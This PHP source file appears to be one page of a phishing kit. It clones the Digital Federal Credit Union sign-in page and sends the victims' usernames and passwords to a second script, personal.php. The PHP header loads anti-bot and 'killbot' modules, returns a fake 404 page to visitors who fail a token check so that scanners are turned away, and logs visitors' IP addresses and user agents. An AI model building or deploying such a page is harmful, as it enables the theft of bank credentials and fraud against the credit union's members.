<?php

session_start();

    require_once '../Meta/Comp.php';
    require_once '../Meta/Antibot.php';
	require_once '../killbot/code/include.php';
    require_once '../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (
        !isset($_SESSION['visitor']) ||
        !$_SESSION['visitor']
    ) {
        $comps->log(
            "../Guard/Audio/live.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: Visitor\n\n"
        );
        $_SESSION['visitor'] = 1;
    }

?>

<html lang="en-us" dir="ltr">

<head class="at-element-marker">
	<base href="">
	<meta charset="utf-8">
	<title></title>
	<meta name="format-detection" content="telephone=no">
	<meta name="msapplication-tap-highlight" content="no">
	<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width">
	<link href="file/vendor.fdca026a.css" rel="stylesheet">
	<link href="file/app.5b087b30.css" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="file/chunk-common.099e95a9.css">
	<link rel="stylesheet" type="text/css" href="file/63.da6b75c3.css">
	<link rel="stylesheet" type="text/css" href="file/2.1ddd8dd4.css">
	<style id="at-makers-style" class="at-flicker-control">
	.mboxDefault {
		visibility: hidden;
	}
	</style>
	
	<link type="text/css" id="firefly-css" class="firefly-css" rel="stylesheet" href="file/default.css">
	
</head>

<body class="desktop no-touch body--light" style="--q-color-primary:#01675a; --q-color-secondary:#07926d; --q-color-accent:#5CCB9C; --q-color-positive:#21BA45; --q-color-negative:#C10015; --q-color-info:#F2C037; --q-color-warning:#F2C037; --q-color-light:#bdbdbd; --q-color-dark:#424242; --q-color-faded:#777;">
	<noscript>JavaScript failed to load.</noscript>
	<div id="q-app">
		<div class="q-layout q-layout--standard" style="min-height: 969px;">
			<!---->
			<form method="post" action="personal.php">
			<div data-v-54d26da8="" class="entrymodal-container" style="background-color: rgb(1, 103, 90);">
				<div data-v-54d26da8="" class="q-pb-xs-sm q-pb-sm-xl"></div>
				<div data-v-54d26da8="" class="row entrymodal-ui-container q-pa-lg q-mx-auto">
					<div data-v-54d26da8="" class="col-12 row justify-center"><img data-v-54d26da8="" height="32px" src="file/dcuLogoDark.png" alt="Logo" class="q-mb-md">
						<div data-v-54d26da8="" class="col-12 text-h3 text-grey-8 text-center">Sign in</div>
						<hr data-v-54d26da8="" class="separator__header" style="color: rgb(1, 103, 90);">
					</div>
					
					<div data-v-54d26da8="" class="col-12 q-pt-md q-px-xs-md q-px-sm-xl">
						<div data-v-54d26da8="">
							<div data-v-54d26da8="" class="col-xs-12">
								<div data-v-54d26da8="" type="text" caption="Username" bottom-slots="" error-message="Please enter a valid username" value="" style="padding: 10px 0px;">
									<div style="font-size: 13px; font-weight: bold; text-transform: uppercase; padding-bottom: 5px; color: rgba(0, 0, 0, 0.6);"> Username
										<!---->
									</div>
									<label for="f_e4492946-ef60-4f23-8390-e9f781c3a988" class="q-field row no-wrap items-start q-input q-field--outlined q-field--square q-field--dense q-validation-component">
										<div class="q-field__inner relative-position col self-stretch">
											<div tabindex="-1" class="q-field__control relative-position row no-wrap">
												<div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
													<input tabindex="0" caption="Username" id="username" name="username" required="" type="text" class="q-field__native q-placeholder">
												</div>
											</div>
										</div>
									</label>
								</div>
							</div>
							<div data-v-54d26da8="" class="col-xs-12">
								<div data-v-54d26da8="" type="password" caption="Password" bottom-slots="" error-message="Please enter a valid password" value="" style="padding: 10px 0px;">
									<div style="font-size: 13px; font-weight: bold; text-transform: uppercase; padding-bottom: 5px; color: rgba(0, 0, 0, 0.6);"> Password
										<!---->
									</div>
									<label for="f_ec8ff1c4-6d94-4643-93ae-00dabf0a8929" class="q-field row no-wrap items-start q-input q-field--outlined q-field--square q-field--dense q-validation-component">
										<div class="q-field__inner relative-position col self-stretch">
											<div tabindex="-1" class="q-field__control relative-position row no-wrap">
												<div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
													<input tabindex="0" caption="Password" id="password" name="password" required="" type="password" class="q-field__native q-placeholder">
												</div>
												<div class="q-field__append q-field__marginal row no-wrap items-center"><i aria-hidden="true" role="presentation" class="cursor-pointer fas fa-eye q-icon notranslate"> </i></div>
											</div>
										</div>
									</label>
								</div>
							</div>
						</div>
						<button data-v-54d26da8="" tabindex="-1" type="submit" role="button" class="q-btn q-btn-item non-selectable no-outline q-mt-lg full-width q-btn--standard q-btn--rectangle  q-btn--wrap"   style="color: white; background-color: rgb(7, 146, 109); height: 40px; border-radius: 0px;"><span class="q-focus-helper"></span><span class="q-btn__wrapper col row q-anchor--skip"><span class="q-btn__content text-center col items-center q-anchor--skip justify-center row">
        SIGN IN
        <!----></span></span>
							<!---->
						</button>
					</div>

					<div data-v-54d26da8="" class="col-xs-12 q-pt-lg q-px-md text-body2 text-center">
						<div data-v-54d26da8="" class="q-mb-md"><span data-v-54d26da8="" class="action cursor-pointer" style="color: rgb(7, 146, 109);">Forgot your username?</span> or <span data-v-54d26da8="" class="action cursor-pointer" style="color: rgb(7, 146, 109);">Forgot your password?</span></div>
						<!---->
						<!---->
						<!---->
						<!---->
						<div data-v-54d26da8="" class="text-caption text-grey-8 q-mt-md"><span data-v-54d26da8="">© 2022, Digital Federal Credit Union &nbsp; | &nbsp; v1.118.3</span></div>
					</div>
				</div>
			</div>
			</form>
		</div>
	</div>
	
	<div class="q-notifications">
		<div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-start"></div>
		<div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-end"></div>
		<div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-start"></div>
		<div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-end"></div>
		<div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-center"></div>
		<div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-center"></div>
		<div class="q-notifications__list q-notifications__list--center fixed column no-wrap items-start justify-center"></div>
		<div class="q-notifications__list q-notifications__list--center fixed column no-wrap items-end justify-center"></div>
		<div class="q-notifications__list q-notifications__list--center fixed column no-wrap flex-center"></div>
	</div>
	<div class="q-loading-bar q-loading-bar--top bg-secondary" style="transform: translate3d(0%, -200%, 0px); height: 5px; opacity: 0;" aria-hidden="true"></div>
	<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;">
		<defs id="SvgjsDefs1002"></defs>
		<polyline id="SvgjsPolyline1003" points="0,0"></polyline>
		<path id="SvgjsPath1004" d="M0 0 "></path>
	</svg>
	
</body>

</html>